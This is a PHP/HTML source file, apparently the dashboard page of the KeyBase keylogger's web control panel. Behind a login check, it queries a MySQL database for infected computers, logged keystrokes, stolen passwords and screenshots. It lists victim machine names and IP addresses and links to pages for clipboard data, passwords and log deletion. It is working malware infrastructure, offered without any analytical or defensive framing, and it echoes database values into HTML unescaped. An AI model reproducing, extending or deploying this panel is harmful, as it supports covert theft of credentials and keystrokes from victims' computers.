<?php
ob_start();
session_start();
if (!isset($_SESSION['logged_in']) 
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>KeyBase Web Panel</title>
	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
     <!-- MORRIS CHART STYLES-->
    <link href="assets/js/morris/morris-0.4.3.min.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
</head>
<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="index.php">KeyBase</a> 
            </div>
  <div style="color: white;
padding: 15px 50px 5px 50px;
float: right;
font-size: 16px;"><a href="login.php" class="btn btn-danger square-btn-adjust">Logout</a> </div>
        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
                    <li>
                        <a class="active-menu"  href="index.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard</a>
                    </li>
                     <li>
                        <a  href="keystrokes.php"><i class="fa fa-desktop fa-3x"></i> Keystrokes</a>
                    </li>
                    <li>
                        <a  href="screenshots.php"><i class="fa fa-qrcode fa-3x"></i> Screenshots</a>
                    </li>
						   <li  >
                        <a   href="clipboard.php"><i class="fa fa-bar-chart-o fa-3x"></i> Clipboard</a>
                    </li>	
                      <li  >
                        <a  href="passwords.php"><i class="fa fa-table fa-3x"></i> Passwords</a>
                    </li>
                    <li  >
                        <a  href="delete.php"><i class="fa fa-qrcode fa-3x"></i> Delete Logs</a>
                    </li>                   
                    
                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-md-12">
                     <h2>Admin Dashboard</h2>   
                        <h5>Welcome, love to see you back. </h5>
                    </div>
                </div>              
                 <!-- /. ROW  -->
                  <hr />
                <div class="row">
                <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <span class="icon-box bg-color-red set-icon">
                    <i class="fa fa-envelope-o"></i>
                </span>
                <div class="text-box" >
                    <p class="main-text">
<?php
include ("config.php");
$link = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);
$result = mysqli_query( $link,"SELECT COUNT(DISTINCT(machinename)) FROM Keystrokes");
$count = mysqli_fetch_array($result);
echo $count[0];
?>
</p>
                    <p class="text-muted">Computers</p>
                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <span class="icon-box bg-color-green set-icon">
                    <i class="fa fa-bars"></i>
                </span>
                <div class="text-box" >
                    <p class="main-text">
<?php
include ("config.php");
$link = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);
$result = mysqli_query( $link,"SELECT * FROM Keystrokes");
$num_rows = mysqli_num_rows($result);
echo "$num_rows \n";
?>
</p>
                    <p class="text-muted">Keystrokes</p>
                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <span class="icon-box bg-color-blue set-icon">
                    <i class="fa fa-bell-o"></i>
                </span>
                <div class="text-box" >
                    <p class="main-text">
<?php
include ("config.php");
$link = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database);
$result = mysqli_query( $link,"SELECT * FROM Passwords");
$num_rows = mysqli_num_rows($result);
echo "$num_rows \n";
?>
</p>
                    <p class="text-muted">Passwords </p>
                </div>
             </div>
		     </div>
                    <div class="col-md-3 col-sm-6 col-xs-6">           
			<div class="panel panel-back noti-box">
                <span class="icon-box bg-color-brown set-icon">
                    <i class="fa fa-rocket"></i>
                </span>
                <div class="text-box" >
                    <p class="main-text">
<?php
$count = count(glob("image/Images/*.jpg")) + count(glob("image/Images/*.png"));
echo $count;
?>
</p>
                    <p class="text-muted">Screenshots </p>
                </div>
             </div>
		     </div>
</div>
<div class="row">
                <div class="col-md-12">
                   
			<!-- Advanced Tables -->
                    <div class="panel panel-default">
                        <div class="panel-heading">
                           Notifications from Computers
                        </div>
                        <div class="panel-body">
                            <div class="table-responsive">
                                <table class="table table-striped table-bordered table-hover" id="Notifications">
                                   <?php
include ('config.php');
$table = "Notifications";
$conn = mysqli_connect($mysql_host, $mysql_user, $mysql_password, $mysql_database );
echo '
<thead>
<tr bgcolor="#3399FF">
';
echo '

<th>Machine Name</th>
<th>Machine Time</th>
<th>IP Address</th>
<th>Date</th>

</tr>
</thead>
<tbody>
';
$query  = "select * from $table";
$result = mysqli_query($conn, $query);
 while ( $row = mysqli_fetch_assoc($result) )
{
    unset($row['id']);
    echo "<tr>";
    foreach ($row as $key => $value)
    {
        echo "<td>$value</td>";
    }
    echo "</tr>";
}
 
echo '
</tbody>
</table>
</body>
</html>
';
?>				 
                                </table>
                            </div>
                        </div>
                    </div>
<!--End Advanced Tables -->
                   </div>
			</div>
                
			</div>

                      
    </div>
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
<script>
            $(document).ready(function () {
                $('#Notifications').dataTable();
            });
    </script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
     <!-- MORRIS CHART SCRIPTS -->
     <script src="assets/js/morris/raphael-2.1.0.min.js"></script>
    <script src="assets/js/morris/morris.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
     
   
</body>
</html>